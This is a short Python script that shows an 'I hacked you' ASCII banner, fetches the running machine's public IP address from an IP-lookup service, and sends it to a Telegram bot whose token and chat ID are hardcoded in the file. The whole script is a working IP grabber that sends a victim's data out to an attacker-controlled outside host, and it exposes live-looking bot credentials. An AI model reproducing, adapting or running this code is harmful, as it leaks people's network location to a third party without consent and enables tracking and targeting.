
print('''
             ______  _______
          __-      -_-      -__
      ___-                     -____
      \                            /
       \       I hacked you       /
        \                        /
         \                      /
          \                    /
           \                  /
            \                /
             \              /
              \____________/

''')

import requests
import json

# Set your Telegram bot token and chat ID
bot_token = '6394165617:AAG_7mPS94rOzMLS1PASfInDU-_3yuaq024'
chat_id = '6226599702'

# Function to get public IP
def get_public_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip_address = json.loads(response.text)['ip']
    return ip_address

# Function to send IP to Telegram bot
def send_ip_to_telegram(ip):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': chat_id, 'text': f'Current IP: {ip}'}
    response = requests.post(url, data)
    if response.ok:
        print('IP sent successfully!')
    else:
        print('Failed to send IP.')

if __name__ == '__main__':
    ip_address = get_public_ip()
    send_ip_to_telegram(ip_address)
